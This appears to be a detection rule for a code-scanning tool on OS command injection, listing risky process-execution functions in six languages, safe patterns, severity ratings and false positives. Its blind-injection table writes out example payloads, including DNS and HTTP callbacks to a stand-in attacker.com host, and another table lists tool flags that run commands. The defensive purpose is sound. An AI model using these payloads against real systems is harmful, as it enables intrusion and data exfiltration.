<!-- CANARY:RGS:rule:command-injection -->

# OS Command Injection Detection

## Prerequisites
- Application invokes OS commands or shell processes
- User input flows into command arguments, command strings, or shell contexts
- Process execution functions or APIs used in non-test application code

## Overview

OS command injection occurs when user-controlled input is incorporated into a system
command without proper sanitization, allowing an attacker to execute arbitrary OS
commands. Impact is typically CRITICAL -- full system compromise, data exfiltration,
lateral movement.

Command injection is distinct from code injection (eval/exec). Command injection
targets shell execution; code injection targets language runtime evaluation.

## Sink Functions by Language

### Python
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `os.system(cmd)` | Yes (always) | CRITICAL -- full shell metacharacter surface |
| `os.popen(cmd)` | Yes (always) | CRITICAL |
| `subprocess.run(cmd, shell=True)` | Yes | CRITICAL |
| `subprocess.call(cmd, shell=True)` | Yes | CRITICAL |
| `subprocess.Popen(cmd, shell=True)` | Yes | CRITICAL |
| `subprocess.run([cmd, arg], shell=False)` | No | LOW -- argument injection only |
| `subprocess.run(cmd_string)` | No (but parsed) | MEDIUM -- string splitting can be confused |
| `commands.getoutput(cmd)` | Yes | CRITICAL (deprecated but found in legacy code) |

**Safe patterns**:
- `subprocess.run(["binary", arg1, arg2])` with list form and `shell=False` (default)
- `shlex.quote(user_input)` before interpolation into shell commands
- `shlex.split()` for parsing command strings safely

### JavaScript / Node.js
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `child_process.exec(cmd)` | Yes (always) | CRITICAL |
| `child_process.execSync(cmd)` | Yes (always) | CRITICAL |
| `child_process.spawn(cmd, {shell: true})` | Yes | CRITICAL |
| `child_process.spawn(bin, [args])` | No (default) | LOW -- argument injection only |
| `child_process.execFile(bin, [args])` | No | LOW -- no shell |
| `child_process.fork(module)` | No shell | LOW -- but `execArgv` poisoning possible |

**Safe patterns**:
- `child_process.execFile(binary, [arg1, arg2])` -- no shell invocation
- `child_process.spawn(binary, [arg1, arg2])` -- no shell by default

### Java
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `Runtime.getRuntime().exec(cmd_string)` | No shell | MEDIUM -- splits on space, argument injection possible |
| `Runtime.getRuntime().exec(new String[]{...})` | No shell | LOW |
| `ProcessBuilder(cmd_string)` | No shell | MEDIUM -- single string form |
| `ProcessBuilder(cmd, arg1, arg2)` | No shell | LOW |
| `ProcessBuilder(...).command("sh", "-c", cmd)` | Yes | CRITICAL -- explicit shell |

**Key Java distinction**: `Runtime.exec()` does NOT invoke a shell. Metacharacters
(`&`, `|`, `;`) are passed as literal arguments, not interpreted. However, argument
injection is still possible when user input becomes a command argument.

**Safe patterns**:
- `new ProcessBuilder("cmd", "arg1", "arg2")` with separate strings
- Allowlist validation of command arguments

### PHP
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `system($cmd)` | Yes | CRITICAL |
| `exec($cmd)` | Yes | CRITICAL |
| `passthru($cmd)` | Yes | CRITICAL |
| `shell_exec($cmd)` | Yes | CRITICAL |
| `popen($cmd, $mode)` | Yes | CRITICAL |
| `proc_open($cmd, ...)` | Yes | CRITICAL |
| Backtick operator `` `$cmd` `` | Yes | CRITICAL |

**Safe patterns**:
- `escapeshellarg($input)` -- wraps in single quotes, prevents command chaining
- `escapeshellcmd($input)` -- escapes metacharacters but allows argument injection

**Important**: `escapeshellarg()` prevents command injection but NOT argument injection.
`escapeshellcmd()` prevents neither reliably.

### Ruby
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `system(cmd_string)` (single arg) | Yes | CRITICAL |
| `system(cmd, arg1, arg2)` (multi arg) | No | LOW |
| Backticks `` `cmd` `` | Yes | CRITICAL |
| `%x(cmd)` / `%x{cmd}` | Yes | CRITICAL |
| `IO.popen(cmd_string)` | Yes | CRITICAL |
| `Open3.capture2(cmd_string)` | Yes | CRITICAL |
| `Kernel.exec(cmd_string)` | Yes | CRITICAL |

**Safe patterns**:
- `system("binary", arg1, arg2)` multi-argument form
- `Open3.capture3("binary", arg1, arg2)` multi-argument form

### Go
| Function | Shell Involved | Risk |
|----------|---------------|------|
| `exec.Command("sh", "-c", userInput)` | Yes | CRITICAL |
| `exec.Command("bash", "-c", userInput)` | Yes | CRITICAL |
| `exec.Command(binary, arg1, arg2)` | No | LOW -- argument injection only |

**Safe patterns**:
- `exec.Command("binary", arg1, arg2)` -- no shell invocation
- Allowlist validation of binary name and arguments

## Shell Metacharacter Reference

These characters enable command chaining when user input reaches a shell:

| Character | Effect | Platforms |
|-----------|--------|-----------|
| `;` | Command separator | Unix |
| `&` | Background + next command | Unix, Windows |
| `&&` | Execute next if previous succeeds | Unix, Windows |
| `\|` | Pipe output to next command | Unix, Windows |
| `\|\|` | Execute next if previous fails | Unix, Windows |
| `` ` `` | Inline command execution | Unix |
| `$()` | Inline command execution | Unix |
| `\n` / `0x0a` | Newline as command separator | Unix |
| `>` / `>>` | Output redirection | Unix, Windows |
| `<` | Input redirection | Unix, Windows |

When user input is inside quotes, the attacker must first terminate the quote context
(`"` or `'`) before injecting metacharacters.

## Argument Injection

Even when shell metacharacters are properly escaped or no shell is invoked, user input
as a command argument can be dangerous. These binaries have flags that enable code
execution or file write:

| Binary | Dangerous Flag | Impact |
|--------|---------------|--------|
| `curl` | `--output <path>` | Write arbitrary files |
| `wget` | `--directory-prefix=<path>` | Write to arbitrary directory |
| `tar` | `--checkpoint-action=exec=<cmd>` | Command execution |
| `git` | `--upload-pack=<cmd>` | Command execution |
| `rsync` | `-e <cmd>` | Command execution via shell |
| `find` | `-exec <cmd>` | Command execution |
| `zip` | `-T --unzip-command=<cmd>` | Command execution |
| `ssh` | `-o ProxyCommand=<cmd>` | Command execution |
| `awk` | `system(<cmd>)` in script | Command execution |
| `perl` | `-e <code>` | Code execution |

**Defense**: Use `--` separator before user-controlled arguments to prevent flag
interpretation: `curl -- "$user_url"`

## Blind Command Injection

When command output is not returned in the response:

| Technique | Pattern | Detection |
|-----------|---------|-----------|
| Time delay | `; sleep 10 ;` or `& ping -c 10 127.0.0.1 &` | Response time difference |
| Output redirect | `& whoami > /var/www/static/out.txt &` | Retrieve file via HTTP |
| DNS exfiltration | `` & nslookup `whoami`.attacker.com & `` | Monitor DNS logs |
| HTTP callback | `& curl http://attacker.com/log &` | Monitor HTTP server |

## False Positive Patterns

These patterns are NOT vulnerable to command injection:

- `subprocess.run(["binary", arg1, arg2])` -- list form with `shell=False` (Python default)
- `ProcessBuilder("cmd", "arg1", "arg2")` -- separate argument form (Java)
- `child_process.execFile(binary, [args])` -- no shell (Node.js)
- `child_process.spawn(binary, [args])` -- no shell by default (Node.js)
- `system("binary", arg1, arg2)` -- multi-argument form (Ruby)
- `escapeshellarg($input)` wrapping -- prevents command chaining (PHP)
- Hardcoded commands with NO user input in arguments
- Commands in build scripts, Makefiles, Dockerfiles, CI configuration (not production code)
- `exec.Command("binary", arg1, arg2)` -- no shell (Go)

## Severity Guidelines

| Scenario | Severity |
|----------|----------|
| User input reaches shell execution, no sanitization | CRITICAL |
| User input reaches shell execution, partial sanitization (bypassable) | CRITICAL |
| User input reaches non-shell exec, argument injection possible | HIGH |
| Blind command injection (no output) with confirmed execution | CRITICAL |
| Command execution in authenticated-only endpoint | HIGH (reduced from CRITICAL) |
| Command execution in admin-only endpoint | HIGH (reduced from CRITICAL) |
| Shell execution in dormant/uncalled function | HIGH (dormant annotation) |
| `escapeshellarg` wrapping with argument injection possible | MEDIUM |
